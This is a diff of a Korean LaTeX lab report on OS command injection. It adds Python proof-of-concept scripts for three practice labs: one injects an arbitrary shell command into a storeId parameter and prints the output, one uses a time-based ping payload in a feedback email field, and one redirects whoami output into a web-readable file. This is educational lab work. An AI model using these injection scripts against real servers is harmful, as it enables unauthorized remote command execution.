@@ -63,8 +63,8 @@
 \maketitle
 
 \noindent\begin{tabular}{@{}ll}
-  Student & Jeongmin Lee\\
-  Contributor & \textit{Jonghyeok Kim, Chanhang Lee, Nurnazihah Intan, VIDAL VILLALBA PEDRO}\\
+  Student & \textit{Jeongmin Lee}\\
+  Contributor & \textit{Jonghyeok Lee, Chanhang Lee, Nurnazihah Intan, Pedro Vidal Villalba}\\
 \end{tabular}
 
 \section*{개요}
@@ -213,6 +213,7 @@ os.system(cmd)  # Executes the entire command via shell
 실습을 진행하며, 위에서 설명하지 않은 부분들에 대해서 추가 설명을 덧붙이겠습니다.
 단, 4번 5번 문항의 경우 Burp Collaborator가 필요합니다. 이는 유료 Burp Suite Professional 에디션에서만 사용할 수 있으며, 연간 라이센스 비용이 400 달러 이상입니다. 
 따라서 이 보고서에서는 Collaborator가 필요한 문제 4와 5를 제외합니다.
+또한, 실습에 대한 답은 python 스크립트와 Burpsuite를 이용한 버전 두 가지를 모두 첨부하였습니다.
 
 \subsection*{Lab: OS command injection, simple case}
 \begin{description}
@@ -268,7 +269,7 @@ os.system(cmd)  # Executes the entire command via shell
       \end{tabular}
     \end{center}
 
-    \item[\textbf{풀이}:] \leavevmode\par
+    \item[\textbf{Burpsuite 풀이}:] \leavevmode\par
     서버 컴퓨터에 명령어를 보내 공격하여야 하기 때문에 저희가 주목해야 할 HTTP 요청은 POST 요청입니다.
     따라서, Burpsuite를 통해 요청을 가로채고, \texttt{whoami} 명령을 삽입하여 공격을 수행해야합니다.
     자세한 풀이 과정은 아래와 같습니다.
@@ -315,6 +316,54 @@ os.system(cmd)  # Executes the entire command via shell
       \end{figure}
       
     \end{enumerate}
+
+    \item[\textbf{Python 풀이}:] \leavevmode\par
+    아래의 python 스크립트는 취약한 웹 애플리케이션의 파라미터(`storeId`)에 명령어 삽입 페이로드를 전송하여 원격 명령 실행 여부를 확인하는 간단한 PoC입니다. 핵심 동작은 아래와 같습니다.
+
+    주요 동작:
+    \begin{itemize}
+      \item POST 요청을 \texttt{/product/stock} 경로로 보내고, \texttt{storeId}에 \texttt{'1 \&\& <command>'} 형태의 페이로드를 삽입합니다.
+      \item 응답 텍스트 길이를 기준으로 명령 실행 성공 여부를 단순 판정합니다(예: \texttt{len(r.text) > 3}).
+      \item 로컬 프록시(127.0.0.1:8080)를 사용하도록 \texttt{proxies}가 설정되어 있어 Burp/mitmproxy 등으로 트래픽을 관찰할 수 있습니다.
+    \end{itemize}
+
+    \begin{lstlisting}[label={lst:modified-request},caption={Python script for problem 1}, showspaces=false,showstringspaces=false]
+    import requests
+    import sys
+    import urllib3
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    # Send the requests through Burp to be able to examine them
+    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+    def run_command(url: str, command: str):
+        stock_path = '/product/stock'
+        command_injection = '1 && ' + command
+        params = {'productId': '1', 'storeId': command_injection}
+        r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
+        if (len(r.text) > 3):
+            print(f"(+) Command injection succesful!")
+            print(f"(+) Output of command:\n{r.text}")
+        else:
+            print("(-) Command injection failed.")
+
+    def main():
+        # Check the number of arguments to the program is correct
+        if len(sys.argv) != 3:
+            print(f"(-) Usage: {sys.argv[0]} <url> <command>")
+            print(f"(-) Example: {sys.argv[0]} www.example.com whoami")
+            sys.exit(1)
+
+        url = sys.argv[1]
+        command = sys.argv[2]
+        print(f"(+) Exploiting command injection...")
+        run_command(url, command)
+
+    if __name__ == '__main__':
+        main()
+  \end{lstlisting}
+    
 \end{description}
 
 \newpage
@@ -343,7 +392,7 @@ os.system(cmd)  # Executes the entire command via shell
       \item 응답 시간이 10초 이상 걸리면, 해당 명령이 성공적으로 실행된 것으로 판단할 수 있습니다.
     \end{itemize}
 
-    \item[\textbf{풀이}:] \leavevmode\par
+    \item[\textbf{Burpsuite 풀이}:] \leavevmode\par
 
     \begin{enumerate}
       \item Burpsuite를 실행하고, Proxy 탭에서 Intercept가 On 상태임을 확인
@@ -383,6 +432,58 @@ os.system(cmd)  # Executes the entire command via shell
       \end{figure}
 
     \end{enumerate}
+
+    \newpage
+    \item[\textbf{Python 풀이}:] \leavevmode\par
+    다음 파이썬 스크립트는 피드백 폼의 \texttt{email} 필드에 시간 지연을 유발하는 페이로드를 삽입하여, 서버가 해당 입력을 쉘로 해석하는지(시간 기반 명령어 삽입 취약성)를 확인하는 PoC입니다. 
+    스크립트는 먼저 피드백 페이지에서 CSRF 토큰을 추출한 뒤, `ping -c 10 localhost` 명령을 포함한 값을 전송하고 응답 지연(10초)을 기준으로 취약 여부를 판별합니다. 
+    모든 요청은 로컬 프록시(예: Burp Suite)로 전달되도록 설정되어 있어 트래픽 분석이 가능합니다.
+
+    \begin{lstlisting}[label={lst:modified-request},caption={Python script for problem 2}, showspaces=false,showstringspaces=false]
+    import requests
+    import sys
+    import urllib3
+    from bs4 import BeautifulSoup
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
+
+    def get_crsf(s, url):
+        feedback_path = "/feedback"
+        r = s.get(url + feedback_path, verify=False)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        csrf = soup.find('input')['value']
+        return csrf
+
+    def check_command_injection(s, url):
+        submit_feedback_path = "/feedback/submit"
+        command_injection = "test@test.com; ping -c 10 localhost #"
+        csrf_token = get_crsf(s, url)   # Retrieve CSRF in order to send a valid request
+        data = { 'csrf': csrf_token, 'name': "test", 'email': command_injection,
+                'subject': "testing", 'message': "This is a test"}
+        res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
+        if (res.elapsed.total_seconds() >= 10):
+            print("(+) Email field vulnerable to time-based command injection")
+        else:
+            print("(-) Email field not vulnerable to time-based command injection")
+
+    def main():
+        if len(sys.argv) != 2:
+            print(f"(-) Usage: {sys.argv[0]} <url>")
+            print(f"(-) Example: {sys.argv[0]} www.example.com")
+            sys.exit(1)
+
+        url = sys.argv[1]
+        print("(+) Checking if email parameter is vulnerable to time-based command injection...")
+
+        s = requests.Session()
+        check_command_injection(s, url)
+
+
+    if __name__ == '__main__':
+        main()
+  \end{lstlisting}
 
     \newpage
     \item[추가 분석: Email 필드 외 다른 필드가 안되는 이유]\leavevmode\par
@@ -454,7 +555,7 @@ os.system(cmd)  # Executes the entire command via shell
       \item 이미지 URL: 웹에서 이미지를 불러오는 방법
     \end{itemize}
 
-  \item[\textbf{풀이}:] \leavevmode\par
+  \item[\textbf{Burpsuite 풀이}:] \leavevmode\par
     3번 문제와 마찬가지로 Burpsuite를 사용하여 피드백 제출 요청을 가로채고, whoami 명령을 삽입하여 공격을 수행합니다.
     다만, 이번에는 whoami 명령의 출력을 \texttt{/var/www/images/} 디렉터리의 파일로 리다이렉트한 뒤, 
     그 파일을 불러오는 이미지 URL을 통해 파일 내용을 확인합니다.
@@ -496,6 +597,64 @@ os.system(cmd)  # Executes the entire command via shell
       \end{figure}
 
   \end{enumerate}
+
+  \newpage
+  \item[\textbf{Python 풀이}:] \leavevmode\par
+    다음 파이썬 스크립트는 피드백 폼의 \texttt{email} 필드에 명령어 삽입 페이로드를 전송하여, whoami 명령을 실행하고 그 출력을 \texttt{/var/www/images/output.txt} 파일로 리다이렉트하는 PoC입니다. 
+    이후, 해당 파일을 이미지 URL을 통해 불러와 명령 실행 결과를 확인합니다. 
+
+    \begin{lstlisting}[label={lst:modified-request},caption={Python script for problem 3}, showspaces=false,showstringspaces=false]
+    import requests
+    import sys
+    import urllib3
+    from bs4 import BeautifulSoup
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
+
+    # Get the CSRF in the /feedback page before exploiting the form vulnerability
+    def get_csrf(s, url):
+        feedback_path = "/feedback"
+        r = s.get(url + feedback_path, verify=False)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        csrf = soup.find('input')['value']
+        return csrf
+
+    def check_command_injection(s, url):
+        submit_feedback_path = "/feedback/submit"
+        command_injection = "test@test.com; whoami > /var/www/images/output-py.txt #"
+        csrf_token = get_csrf(s, url)   # Retrieve CSRF in order to send a valid request
+        data = { 'csrf': csrf_token, 'name': "test", 'email': command_injection,
+                'subject': "testing", 'message': "This is a test"}
+        res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
+        print("(+) Verifying if command injection exploit worked...")
+
+        # Verify command injection
+        file_path = "/image?filename=output-py.txt"
+        res = s.get(url + file_path, verify=False, proxies=proxies)
+        if (res.status_code == 200): # All good
+            print("(+) Command injection succesful!")
+            print(f"(+) The following is the content of the command: {res.text}")
+        else:
+            print("(-) Command injection was not succesful.")
+
+    def main():
+        if len(sys.argv) != 2:
+            print(f"(-) Usage: {sys.argv[0]} <url>")
+            print(f"(-) Example: {sys.argv[0]} www.example.com")
+            sys.exit(1)
+
+        url = sys.argv[1]
+        print("(+) Exploiting blind command injection in email field...")
+
+        s = requests.Session()
+        check_command_injection(s, url)
+
+
+    if __name__ == '__main__':
+        main()
+    \end{lstlisting}
 
 
 \end{description}
